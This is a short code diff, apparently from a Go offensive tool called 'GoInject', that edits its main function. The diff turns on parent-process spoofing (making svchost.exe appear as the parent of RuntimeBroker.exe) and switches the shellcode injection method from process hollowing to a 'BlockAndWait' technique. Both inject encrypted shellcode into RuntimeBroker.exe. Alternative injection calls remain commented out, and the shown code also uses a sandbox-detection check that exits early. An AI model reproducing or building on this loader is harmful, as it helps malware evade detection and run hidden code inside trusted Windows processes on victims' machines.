@@ -4,7 +4,7 @@ import (
 	"GoInject/sandboxDetection"
 	"GoInject/techniques"
 	"os"
-	//"GoInject/spoof"
+	"GoInject/spoof"
 )
 
 func main(){
@@ -26,12 +26,12 @@ func main(){
    	os.Exit(0)
    }
 
-    //spoof.SpoofParent("C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\System32\\RuntimeBroker.exe")
+    spoof.SpoofParent("C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\System32\\RuntimeBroker.exe")
 	//techniques.CreateRemoteThread("C:\\Windows\\System32\\RuntimeBroker.exe", shellcodeEncrypted, key)
-    //techniques.BlockAndWait("C:\\Windows\\System32\\RuntimeBroker.exe", shellcodeEncrypted, key)
+    techniques.BlockAndWait("C:\\Windows\\System32\\RuntimeBroker.exe", shellcodeEncrypted, key)
 	
 	//techniques.EarlyBirdQueueUserAPC("C:\\Windows\\System32\\RuntimeBroker.exe", shellcodeEncrypted, key)
-	techniques.ProcessHollowing("C:\\Windows\\System32\\RuntimeBroker.exe", shellcodeEncrypted, key)
+	//techniques.ProcessHollowing("C:\\Windows\\System32\\RuntimeBroker.exe", shellcodeEncrypted, key)
 	//techniques.BlockAndWait("C:\\Windows\\System32\\RuntimeBroker.exe", shellcodeEncrypted, key)
 	//techniques.EarlyBirdQueueUserAPC("C:\\Windows\\System32\\RuntimeBroker.exe", shellcodeEncrypted, key)
 
